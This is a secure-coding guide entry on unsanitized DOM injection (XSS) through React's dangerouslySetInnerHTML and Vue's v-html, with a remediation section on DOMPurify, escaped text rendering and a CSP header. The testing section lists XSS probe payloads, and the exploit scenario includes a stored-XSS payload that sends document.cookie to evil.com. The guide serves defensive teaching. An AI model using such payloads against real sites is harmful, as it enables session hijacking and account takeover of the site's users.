# 39. Unsanitized DOM Injection (XSS)

## 🔴 Risk Level: **CRITICAL**

## 📋 Vulnerability Description

To render rich text or AI responses, vibe coders often use `dangerouslySetInnerHTML` (React) or `v-html` (Vue) without sanitization. If the content contains malicious JavaScript (e.g., `<img src=x onerror=alert(1)>`), it executes in the victim's browser, leading to session hijacking.

**Impact:**
- XSS attacks
- Cookie theft
- Session hijacking
- Account takeover
- Malicious script execution

## 🎯 Context: Why This Happens

AI-generated code:
- Uses dangerouslySetInnerHTML for "rich content"
- Doesn't sanitize user input
- Trusts content from API
- Focuses on functionality over security

## 🔍 Detection Methods

### 1. Code Analysis

**Search for:**
```javascript
// ❌ VULNERABLE patterns
dangerouslySetInnerHTML
v-html
innerHTML =
document.write
```

### 2. Testing

**Inject XSS payload:**
```html
<img src=x onerror=alert(1)>
<script>alert(1)</script>
<svg onload=alert(1)>
```

## ✅ Verification Requirements

### Must Have:
1. **Input Sanitization**
   - Sanitize before rendering
   - Use DOMPurify or similar
   - Whitelist allowed tags/attributes

2. **CSP Protection**
   - Content Security Policy
   - Blocks inline scripts
   - Restricts sources

## 🚨 Exploit Path

### Scenario 1: Stored XSS
```
1. Attacker posts comment: <img src=x onerror="fetch('evil.com?cookie='+document.cookie)">
2. Comment stored in database
3. Comment displayed to users
4. XSS executes in victim's browser
5. Cookie sent to attacker
6. Session hijacked
```

## 🔧 Remediation Steps

### Step 1: Install DOMPurify

```bash
npm install dompurify
# For React
npm install dompurify
npm install @types/dompurify --save-dev
```

### Step 2: Sanitize Before Rendering

**React:**
```jsx
import DOMPurify from 'dompurify';

function RichText({ content }) {
  // ✅ SECURE: Sanitize before rendering
  const sanitized = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href']
  });
  
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Vue:**
```vue
<template>
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.content, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href']
      });
    }
  }
}
</script>
```

### Step 3: Use Text Rendering When Possible

```jsx
// ✅ SECURE: Render as text (no HTML)
function Comment({ content }) {
  return <div>{content}</div>; // Automatically escaped
}

// Only use dangerouslySetInnerHTML when absolutely necessary
// And always sanitize first
```

### Step 4: Configure CSP

```javascript
// Backend: Set CSP header
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'"], // Blocks inline scripts
    styleSrc: ["'self'", "'unsafe-inline'"]
  }
}));
```

## 📝 Code Examples

### ❌ Vulnerable

```jsx
// ❌ VULNERABLE: No sanitization
function Comment({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
  // ❌ XSS if content contains <script>
}
```

### ✅ Secure

```jsx
// ✅ SECURE: Sanitized
import DOMPurify from 'dompurify';

function Comment({ content }) {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

## 🧪 Testing Checklist

- [ ] All HTML rendering sanitized
- [ ] DOMPurify or similar used
- [ ] CSP configured
- [ ] XSS payloads blocked
- [ ] Only safe tags allowed
- [ ] Attributes whitelisted

## 📚 References

- [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)

## 🔗 Related Vulnerabilities

- [10. Client-Side Input Validation Only](./10_client_side_validation_only.md)
- [29. Missing Content Security Policy](../api_security/29_missing_csp.md)

---

**Classification**:
- **Confirmed** if dangerouslySetInnerHTML used without sanitization
- **Likely** if sanitization incomplete
- **Not Applicable** if properly sanitized with CSP
